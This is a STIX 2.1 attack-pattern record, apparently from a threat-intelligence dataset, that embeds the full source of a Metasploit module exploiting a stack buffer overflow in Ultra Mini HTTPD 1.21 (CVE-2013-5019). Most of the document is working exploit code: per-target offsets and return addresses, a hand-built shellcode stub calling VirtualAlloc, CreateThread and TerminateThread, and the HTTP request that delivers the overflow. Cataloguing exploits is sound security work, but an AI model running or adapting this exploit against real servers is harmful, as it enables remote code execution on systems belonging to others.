{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--624908d6-85b8-49e6-9d3c-259f5efd691d",
    "created": "2024-08-14T16:52:42.667115Z",
    "modified": "2024-08-14T16:52:42.667119Z",
    "name": "\"Ultra Mini HTTPD Stack Buffer Overflow\"",
    "description": " This module exploits a stack based buffer overflow in Ultra Mini HTTPD 1.21 allowing remote attackers to execute arbitrary code via a long resource name in an HTTP request. This exploit has to deal with the fact that the application's request handler thread is terminated after 60 seconds by a \"monitor\" thread. To do this, it allocates some RWX memory, copies the payload to it and creates another thread. When done, it terminates the current thread so that it doesn't crash and hence doesn't bring down the process with it.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ultraminihttp_bof.rb",
            "external_id": "ultraminihttp_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  ADDR_VIRTUALALLOC    = 0x0041A140\n  ADDR_CREATETHREAD    = 0x0041A240\n  ADDR_TERMINATETHREAD = 0x0041A23C\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Ultra Mini HTTPD Stack Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow in Ultra Mini HTTPD 1.21,\n        allowing remote attackers to execute arbitrary code via a long resource name in an HTTP\n        request. This exploit has to deal with the fact that the application's request handler\n        thread is terminated after 60 seconds by a \"monitor\" thread. To do this, it allocates\n        some RWX memory, copies the payload to it and creates another thread. When done, it\n        terminates the current thread so that it doesn't crash and hence doesn't bring down\n        the process with it.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'superkojiman',                         # Discovery, PoC\n          'PsychoSpy <neinwechter[at]gmail.com>', # Metasploit\n          'OJ Reeves <oj[at]buffered.io>'         # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '95164'],\n          ['EDB','26739'],\n          ['CVE','2013-5019'],\n          ['BID','61130']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x2f\\x3f\"\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'   => \"thread\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'v1.21 - Windows Server 2000',\n            {\n              'Offset' => 5412,\n              'Ret'    => 0x78010324 # push esp / ret - msvcrt.dll\n            }\n          ],\n          [\n            'v1.21 - Windows XP SP0',\n            {\n              'Offset' => 5412,\n              'Ret'    => 0x77C4C685 # push esp / ret - msvcrt.dll\n            }\n          ],\n          [\n            'v1.21 - Windows XP SP2/SP3',\n            {\n              'Offset' => 5412,\n              'Ret'    => 0x77c354b4 # push esp / ret - msvcrt.dll\n            }\n          ],\n          [\n            'v1.21 - Windows Server 2003 (Enterprise)',\n            {\n              'Offset' => 5412,\n              'Ret'    => 0x77BDD7F5 # push esp / ret - msvcrt.dll\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-07-10',\n      'DefaultTarget'  => 0\n    ))\n  end\n\n  def mov_eax(addr)\n    \"\\xB8\" + [addr].pack(\"V*\")\n  end\n\n  def call_addr_eax(addr)\n    mov_eax(addr) + \"\\xff\\x10\"\n  end\n\n  def exploit\n    new_thread = \"\"\n\n    # we use 0 a lot, so set EBX to zero so we always have it handy\n    new_thread << \"\\x31\\xdb\"                          # xor ebx,ebx\n\n    # store esp in esi, and offset it to point at the rest of the payload\n    # as this will be used as the source for copying to the area of memory\n    # which will be executed in a separate thread. We fill in the offset\n    # at the end as we can calculate it instead of hard-code it\n    new_thread << \"\\x89\\xe6\"                          # mov esi,esp\n    new_thread << \"\\x83\\xc6\\x00\"                      # add esp,<TODO>\n    esi_count_offset = new_thread.length - 1\n\n    # Create a new area of memory with RWX permissions that we can copy\n    # the payload to and execute in another thread. This is required\n    # because the current thread is killed off after 60 seconds and it\n    # takes our payload's execution with it.\n    new_thread << \"\\x6a\\x40\"                          # push 0x40\n    new_thread << \"\\x68\\x00\\x30\\x00\\x00\"              # push 0x3000\n    new_thread << \"\\x68\\x00\\x10\\x00\\x00\"              # push 0x1000\n    new_thread << \"\\x53\"                              # push ebx (0)\n    new_thread << call_addr_eax(ADDR_VIRTUALALLOC)    # call VirtualAlloc\n\n    # copy the rest of the payload over to the newly allocated area of\n    # memory which is executable.\n    payload_size = [payload.encoded.length].pack(\"V*\")\n    new_thread << \"\\xb9\" + payload_size               # mov ecx,payload_size\n    new_thread << \"\\x89\\xc7\"                          # mov edi,eax\n    new_thread << \"\\xf2\\xa4\"                          # rep movsb\n\n    # kick of the payload in a new thread\n    new_thread << \"\\x53\"                              # push ebx (0)\n    new_thread << \"\\x53\"                              # push ebx (0)\n    new_thread << \"\\x53\"                              # push ebx (0)\n    new_thread << \"\\x50\"                              # push eax (payload dress)\n    new_thread << \"\\x53\"                              # push ebx (0)\n    new_thread << \"\\x53\"                              # push ebx (0)\n    new_thread << call_addr_eax(ADDR_CREATETHREAD)    # call CreateThread\n\n    # Terminate the current thread so that we don't crash and hence bring\n    # the entire application down with us.\n    new_thread << \"\\x53\"                              # push ebx (0)\n    # set ebx to 0xFFFFFFFE as this is the psuedohandle for the current thread\n    new_thread << \"\\x4b\"                              # dec ebx\n    new_thread << \"\\x4b\"                              # dec ebx\n    new_thread << \"\\x53\"                              # push ebx (0xFFFFFFFE)\n    new_thread << call_addr_eax(ADDR_TERMINATETHREAD) # call CreateThread\n\n    # patch the offset of esi back into the payload\n    nops = 32\n    decode_stub_size = 23\n    calculated_offset = new_thread.length + nops + decode_stub_size\n    new_thread[esi_count_offset, 1] = [calculated_offset].pack(\"c*\")\n\n    # start constructing our final payload\n    buf = rand_text_alpha_upper(target['Offset'])\n    buf << [target.ret].pack(\"V*\")\n\n    # ESP points right to the top of our shellcode so we just add a few nops\n    # to the start to avoid having the first few bytes nailed by the decoder.\n    buf << make_nops(nops)\n\n    # we re-encode, including the thread creation stuff and the chosen payload\n    # as we don't currently have the ability to \"prepend raw\" stuff to the front\n    # of the buffer prior to encoding.\n    buf << encode_shellcode_stub(new_thread)\n    buf << payload.encoded\n\n    print_status(\"Sending buffer...\")\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => \"/#{buf}\"\n    })\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-07-10",
    "x_mitre_platforms": [
        "win'"
    ]
}